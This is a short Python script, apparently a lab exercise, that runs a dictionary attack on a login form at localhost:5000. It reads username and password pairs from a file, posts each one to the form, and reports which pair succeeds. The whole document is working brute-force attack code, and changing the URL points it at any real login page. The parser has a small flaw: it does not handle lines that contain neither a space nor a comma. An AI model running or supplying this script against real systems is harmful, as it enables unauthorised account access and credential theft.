import requests

# URL of the login page
url = "http://localhost:5000/login"

# Function to load credentials from a file
def load_credentials(file_path):
    credentials = []
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line:  # Make sure the line isn't empty
                if ' ' in line:
                    username, password = line.split(' ', 1)  # Split by space
                elif ',' in line:
                    username, password = line.split(',', 1)  # Split by comma
                credentials.append({"username": username, "password": password})
    return credentials

# Dictionary attack function
def dictionary_attack(credentials):
    for credential in credentials:
        data = {
            "username": credential["username"],
            "password": credential["password"]
        }
        response = requests.post(url, data=data)

        # Check the response status or content for success or failure
        if "Welcome" in response.text:
            print(f"[SUCCESS] Username: {credential['username']}, Password: {credential['password']}")
            break
        elif "505 Bad cred" in response.text:
            print(f"[FAILED] Username: {credential['username']}, Password: {credential['password']}")
        else:
            print(f"[ERROR] Unexpected response for {credential['username']}")
        
if __name__ == "__main__":
    # Load credentials from the text file
    credentials = load_credentials("credentials.txt")
    dictionary_attack(credentials)

